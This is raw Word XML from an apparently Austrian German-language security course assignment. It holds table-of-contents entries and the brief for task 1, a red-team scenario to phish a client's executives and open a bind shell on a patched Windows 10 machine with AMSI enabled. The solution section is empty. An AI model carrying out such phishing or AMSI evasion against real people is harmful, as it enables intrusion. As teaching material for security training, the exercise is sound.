          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994615 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>26</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4DAD7CEC" w14:textId="5F47E3AF" w:rsidR="008778DD" w:rsidRDefault="00DE67E4">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis2"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9060"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc62994616" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>2.2</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:szCs w:val="22"/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Lösung</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994616 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>27</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="139E448D" w14:textId="07E8EAFD" w:rsidR="008778DD" w:rsidRDefault="00DE67E4">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc62994617" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Abgabe 3 (6P)</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994617 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>38</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="39B88E65" w14:textId="410F6365" w:rsidR="008778DD" w:rsidRDefault="00DE67E4">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis2"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9060"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc62994618" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>3.1</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:szCs w:val="22"/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Angabe</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994618 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>38</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="783B82DE" w14:textId="69B73BE3" w:rsidR="008778DD" w:rsidRDefault="00DE67E4">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis2"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9060"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc62994619" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>3.2</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:szCs w:val="22"/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Lösung</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994619 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>39</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1E18781C" w14:textId="3F53DA6B" w:rsidR="008778DD" w:rsidRDefault="00DE67E4">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc62994620" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Aufgabe 4 (8P)</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994620 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>67</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2BC48E95" w14:textId="0481A13A" w:rsidR="008778DD" w:rsidRDefault="00DE67E4">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis2"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9060"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc62994621" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>4.1</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:szCs w:val="22"/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Angabe</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994621 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>67</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2E9EBDC0" w14:textId="7883AAA3" w:rsidR="008778DD" w:rsidRDefault="00DE67E4">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis2"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9060"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc62994622" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>4.2</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:szCs w:val="22"/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Lösung</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994622 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>68</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1AE23D81" w14:textId="2CDA8F3E" w:rsidR="008778DD" w:rsidRDefault="00DE67E4">
      <w:pPr>
        <w:pStyle w:val="Verzeichnis1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc62994623" w:history="1">
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>5</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD" w:rsidRPr="00A76D90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>Literatur</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc62994623 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A0623">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>86</w:t>
        </w:r>
        <w:r w:rsidR="008778DD">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="20EE28F7" w14:textId="745E2DAA" w:rsidR="00D52BCF" w:rsidRPr="00B47CB9" w:rsidRDefault="009C4F64" w:rsidP="00853CAF">
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:caps/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:caps/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EE28F8" w14:textId="0BEF3EF8" w:rsidR="00D416AA" w:rsidRPr="00B47CB9" w:rsidRDefault="00C77BA2" w:rsidP="00AC4F51">
      <w:pPr>
        <w:pStyle w:val="berschrift1"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc114210880"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
      <w:bookmarkStart w:id="5" w:name="_Toc62994611"/>
      <w:bookmarkEnd w:id="4"/>
      <w:r w:rsidR="0034519B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Aufgabe 1</w:t>
      </w:r>
      <w:r w:rsidR="003709C7" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="009006BD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="003709C7" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>P)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="20EE28FB" w14:textId="3724B8A4" w:rsidR="00D416AA" w:rsidRPr="00B47CB9" w:rsidRDefault="0034519B" w:rsidP="00797BBC">
      <w:pPr>
        <w:pStyle w:val="berschrift2"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc62994612"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Angabe</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="13259150" w14:textId="77777777" w:rsidR="009006BD" w:rsidRPr="00B47CB9" w:rsidRDefault="009006BD" w:rsidP="008778DD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Als Sie in der Früh ins Büro kommen ersucht Sie Ihre Kollegin Beate gleich ins Besprechungszimmer zu kommen. Dort erfahren Sie, dass die Forensik Abteilung bei Ihrer Untersuchung eines Sicherheitsvorfalls bei einem Ihrer wichtigsten Kunden festgestellt hat, dass die bislang unbekannte APT Gruppe „No Regerts“ offenbar über einen Social Engineering Angriff Zugriff auf das System erhielt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23447511" w14:textId="77777777" w:rsidR="009006BD" w:rsidRPr="00B47CB9" w:rsidRDefault="009006BD" w:rsidP="008778DD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Der Kunde hat daraufhin sofort Ihr Red Team beauftragt die User Awareness und Sicherheit im Hinblick auf Social Engineering Angriffe und die vorhandenen Gegenmaßnahmen zu testen. Das Ziel des Red Teams ist es eine mehrstufige, möglichst ausgeklügelte und überzeugende Spear Phishing Kampagne auf Executive Mitarbeiter zu starten.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EA6E3B6" w14:textId="144BE033" w:rsidR="009006BD" w:rsidRPr="00B47CB9" w:rsidRDefault="009006BD" w:rsidP="008778DD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Das Ziel gilt als erreicht, sobald es dem Team gelingt eine Bind Shell auf einem full patched Windows 10 Rechner mit eingeschaltetem AMSI zu starten und sich damit zu verbinden.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57575963" w14:textId="3E6FB606" w:rsidR="008C7E64" w:rsidRPr="00B47CB9" w:rsidRDefault="008C7E64" w:rsidP="008778DD">
      <w:pPr>
        <w:rPr>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE0470E" w14:textId="75F288B7" w:rsidR="002E694B" w:rsidRPr="00B47CB9" w:rsidRDefault="0048463E" w:rsidP="0048463E">
      <w:pPr>
        <w:pStyle w:val="berschrift2"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc62994613"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Lösung</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="6ED30F6D" w14:textId="01966FE3" w:rsidR="00E534F9" w:rsidRPr="00B47CB9" w:rsidRDefault="00E534F9" w:rsidP="00E534F9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
